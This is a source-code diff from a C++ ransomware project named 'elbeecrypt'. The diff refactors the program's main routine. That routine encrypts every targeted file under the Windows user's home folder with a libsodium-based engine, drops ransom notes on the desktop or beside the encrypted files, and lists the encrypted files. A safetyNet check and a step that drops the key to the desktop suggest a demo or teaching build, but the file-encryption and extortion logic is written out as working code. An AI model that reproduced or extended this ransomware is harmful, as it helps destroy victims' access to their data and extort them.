@@ -9,9 +9,9 @@
 
 //Common dependencies
 #include "elbeecrypt/common/settings.hpp"
-#include "elbeecrypt/common/io/cryptor-engine.hpp"
 #include "elbeecrypt/common/targets/extensions.hpp"
 #include "elbeecrypt/common/utils/fs.hpp"
+#include "elbeecrypt/common/utils/stream.hpp"
 #include "elbeecrypt/common/utils/string.hpp"
 #include "elbeecrypt/common/utils/threadsafe_cout.hpp"
 
@@ -59,27 +59,27 @@ int main(int argc, char **argv){
 	const fs::path homeFolder("C:\\Users\\" + std::string(getenv("username")));
 	std::cout << "Base path: " << homeFolder << std::endl;
 
+	//Initialize the cryptor engine
+	common::io::CryptorEngine cryptorEngine(common::Settings::CRYPTO_CHUNK_SIZE);
+	std::cout << "LibSodium Init: " << sodium_init() << std::endl;
+
 	//Encrypt files
 	std::vector<fs::path> roots = {homeFolder};
 	std::cout << "Encryption routines started!" << std::endl;
-	auto encryptorResult = cryptor::Main::encrypt(homeFolder, roots);
+	std::vector<fs::path> successfullyEncrypted = cryptor::Main::encrypt(homeFolder, roots, cryptorEngine);
 
 	//Get the parent paths of the encrypted files
-	std::vector<fs::path> parentPaths = common::utils::FS::getParents(std::get<0>(encryptorResult));
+	std::vector<fs::path> parentPaths = common::utils::FS::getParents(successfullyEncrypted);
 
 	//Drop ransom notes
 	std::vector<fs::path> ransomNoteLocations;
 	if(common::Settings::SPAM_RANSOM_NOTES) ransomNoteLocations = parentPaths;
 	else ransomNoteLocations = {homeFolder / "Desktop"};
-	cryptor::Main::dropRansomNote(ransomNoteLocations, std::get<1>(encryptorResult), roots, std::get<0>(encryptorResult), homeFolder / "Desktop");
+	cryptor::Main::dropRansomNote(ransomNoteLocations, cryptorEngine, roots, successfullyEncrypted, homeFolder / "Desktop");
 	std::cout << "Generated ransom note. Check your desktop." << std::endl;
 
-
-	/*
-	for(fs::path path : paths){
-		writeTo(common::io::DirentWalk::pwd() / "test-paths.txt", path.string());
-	}
-	*/
+	//Write the list of encrypted files to the user's desktop
+	common::utils::Stream::writeToFile(homeFolder / "Desktop" / common::Settings::ENCRYPTED_FILES_LIST_NAME, successfullyEncrypted);
 }
 
 /** Impl of dropRansomNote(vector, CryptorEngine, vector, vector, path). */
@@ -109,22 +109,19 @@ void cryptor::Main::dropRansomNote(
 	//Loop over the target path list
 	for(fs::path target : targets){
 		//Open the target, write the ransom note, and close the file in one fell swoop
-		cryptor::Main::writeToFile(target / common::Settings::RANSOM_NOTE_NAME, ransomNoteFormatted);
+		common::utils::Stream::writeToFile((target / common::Settings::RANSOM_NOTE_NAME), ransomNoteFormatted);
 	}
 }
 
-/** Impl of encrypt(path, vector). */
-std::tuple<std::vector<fs::path>, elbeecrypt::common::io::CryptorEngine> cryptor::Main::encrypt(const fs::path& homeFolder, const std::vector<fs::path>& roots){
-	//Initialize the encryption engine
-	common::io::CryptorEngine cryptorEngine(common::Settings::CRYPTO_CHUNK_SIZE);
-
+/** Impl of encrypt(path, vector, CryptorEngine). */ //TODO: move the cryptor engine creation to main()
+std::vector<fs::path> cryptor::Main::encrypt(const fs::path& homeFolder, const std::vector<fs::path>& roots, common::io::CryptorEngine& cryptorEngine){
 	//Get the list of targets to encrypt
 	cryptor::HunterEncryptor hunter(roots);
 
 	//Check if there's at least one target to encrypt before proceeding
 	if(hunter.getTargets().size() < 1){
 		std::cout << "Nothing to encrypt :(" << std::endl;
-		return std::make_tuple(hunter.getTargets(), cryptorEngine);
+		return hunter.getTargets();
 	}
 
 	//Drop the encryption key to the desktop
@@ -175,7 +172,7 @@ std::tuple<std::vector<fs::path>, elbeecrypt::common::io::CryptorEngine> cryptor
 	common::utils::Cout{} << "Failed to encrypt " << failedEncrypted.size() << " files" << std::endl;
 
 	//Return the list of successfully encrypted files
-	return std::make_tuple(successfullyEncrypted, cryptorEngine);
+	return successfullyEncrypted;
 }
 
 /** Impl of safetyNet(). */
@@ -209,12 +206,4 @@ bool cryptor::Main::safetyNet(){
 
 	//No cancellations, so return true be default
 	return true;
-}
-
-/** Impl of writeToFile(path, string). */
-void cryptor::Main::writeToFile(const fs::path& target, std::string content){
-	//Open the file, write to it, and close
-	std::ofstream file(target.string(), std::ios::app | std::ios::out);
-	file << content << std::endl;
-	file.close();
 }
